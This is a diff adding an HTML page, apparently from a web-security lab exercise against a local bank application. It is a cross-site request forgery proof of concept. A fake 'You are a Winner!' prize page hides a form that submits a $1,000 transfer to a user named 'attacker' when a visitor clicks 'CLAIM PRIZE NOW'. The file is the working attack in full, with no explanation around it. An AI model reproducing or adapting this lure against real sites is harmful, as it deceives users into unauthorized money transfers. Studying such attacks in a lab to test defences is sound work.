@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 100px; }
+        .btn { background-color: #28a745; color: white; padding: 20px 40px; font-size: 24px; border: none; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+<h1>🎉 You are a Winner! 🎉</h1>
+<p>Click below to claim your $1,000 Prize!</p>
+
+<form action="http://localhost/ICA3_BANK/CSRF-protected/bank/update_balance.php" method="POST">
+    <input type="hidden" name="amount" value="1000">
+    <input type="hidden" name="to_user" value="attacker">
+    
+    <button type="submit" class="btn">CLAIM PRIZE NOW</button>
+</form>
+
+</body>
+</html>
